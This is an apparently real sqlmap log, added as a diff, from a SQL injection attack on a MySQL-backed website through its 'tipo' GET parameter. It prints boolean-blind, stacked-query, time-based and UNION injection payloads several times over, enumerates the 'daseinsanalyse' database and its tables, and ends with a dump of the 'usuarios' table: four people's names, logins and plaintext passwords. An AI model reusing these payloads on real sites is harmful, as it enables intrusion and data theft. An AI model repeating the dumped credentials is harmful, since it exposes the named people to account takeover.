@@ -1,0 +1,116 @@
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: tipo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: tipo=1 AND 1190=1190
+    Vector: AND [INFERENCE]
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (query SLEEP - comment)
+    Payload: tipo=1;(SELECT * FROM (SELECT(SLEEP(5)))IsVv)#
+    Vector: ;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: tipo=1 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: tipo=1 UNION ALL SELECT CONCAT(0x7178717871,0x634a475341426a666c79796a4773624d7a45414e4b444747545654676c5a70744c47716365716956,0x71787a7171),NULL,NULL,NULL-- UzqZ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL > 5.0.11
+available databases [2]:
+[*] daseinsanalyse
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tipo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: tipo=1 AND 1190=1190
+    Vector: AND [INFERENCE]
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (query SLEEP - comment)
+    Payload: tipo=1;(SELECT * FROM (SELECT(SLEEP(5)))IsVv)#
+    Vector: ;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: tipo=1 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: tipo=1 UNION ALL SELECT CONCAT(0x7178717871,0x634a475341426a666c79796a4773624d7a45414e4b444747545654676c5a70744c47716365716956,0x71787a7171),NULL,NULL,NULL-- UzqZ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL > 5.0.11
+Database: daseinsanalyse
+[7 tables]
++-------------+
+| agenda      |
+| artigos     |
+| cursos      |
+| mailing     |
+| paginas     |
+| publicacoes |
+| usuarios    |
++-------------+
+
+Database: daseinsanalyse
++-------------+---------+
+| Table       | Entries |
++-------------+---------+
+| mailing     | 1278    |
+| agenda      | 38      |
+| cursos      | 31      |
+| publicacoes | 30      |
+| paginas     | 21      |
+| artigos     | 4       |
+| usuarios    | 4       |
++-------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tipo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: tipo=1 AND 1190=1190
+    Vector: AND [INFERENCE]
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (query SLEEP - comment)
+    Payload: tipo=1;(SELECT * FROM (SELECT(SLEEP(5)))IsVv)#
+    Vector: ;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: tipo=1 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: tipo=1 UNION ALL SELECT CONCAT(0x7178717871,0x634a475341426a666c79796a4773624d7a45414e4b444747545654676c5a70744c47716365716956,0x71787a7171),NULL,NULL,NULL-- UzqZ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL > 5.0.11
+Database: daseinsanalyse
+Table: usuarios
+[4 entries]
++----+---------------------+-----------------+---------+-------+---------+---------------------+-----------+
+| id | inserido            | nome            | senha   | ativo | email   | alterado            | permissao |
++----+---------------------+-----------------+---------+-------+---------+---------------------+-----------+
+| 1  | 2010-11-24 12:41:20 | Leandro Velloso | hb@hb   | 1     | leandro | 2010-11-25 14:22:56 | 1         |
+| 5  | 2010-11-24 00:00:00 | Regina Almeida  | 123456  | 1     | regina  | 2018-07-18 18:15:36 | 1         |
+| 6  | 2010-11-24 18:33:39 | Fátima Prado    | hb@hb12 | 1     | fatima  | 2010-12-13 13:55:45 | 1         |
+| 9  | 2013-08-22 15:31:06 | Renata          | abd@abd | 1     | renata  | 2013-08-22 15:31:06 | 1         |
++----+---------------------+-----------------+---------+-------+---------+---------------------+-----------+
+
